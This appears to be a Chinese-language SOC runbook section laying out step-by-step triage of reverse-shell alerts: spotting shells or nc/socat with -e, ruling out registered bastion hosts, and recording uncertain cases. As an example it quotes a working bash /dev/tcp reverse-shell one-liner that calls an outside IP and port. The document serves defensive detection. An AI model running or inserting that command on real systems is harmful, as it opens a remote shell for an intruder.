# RS-05 · 判定程序：按顺序走，第一个命中就是结论

## 判定程序

**第一个命中的就是结论，不要反复横跳。**

```text
第 0 步 · 这是不是一个「能执行命令的通道」？
        · 进程是 shell / 解释器（RS-03），且命令行里有反弹特征
        · 或 进程是 nc/socat 之类带 -e / exec 参数
        命中                                    → 真实威胁（直接结束）
        ↓ 不是

第 1 步 · 能不能排除「这是攻击」？
        · 对端是**已登记**的运维跳板机 / 堡垒机
        · 且 进程是运维常用的（ssh / scp 之类，不是 shell 反弹）
        两条都成立                              → 误报
        ↓ 缺任一条

第 2 步 · 存疑
        写清缺什么：父进程是谁？对端是不是我们的？
                    命令行参数看不全？
```

### 为什么第 0 步几乎不需要犹豫

**反弹 Shell 的形态太特殊了。**
`bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` 这种写法
**没有任何正当用途** —— 它不是「可能被滥用」，它是「只能这么用」。

**这跟可疑命令类里的双用途工具（`nc`、`python`）不一样：**
那些是「工具本身中性，看怎么用」；
**反弹 Shell 是「形态本身就是恶意的」。**

### 但第 0 步仍然要看两样东西

1. **进程名 + 命令行**（RS-03）—— 光有 `nc` 不够，要看有没有 `-e`
2. **父进程**（RS-02）—— 父进程是 web 进程时，这条几乎可以确认

**父进程拿不到时，不构成「不成立」** —— 只构成「少了一个佐证」。
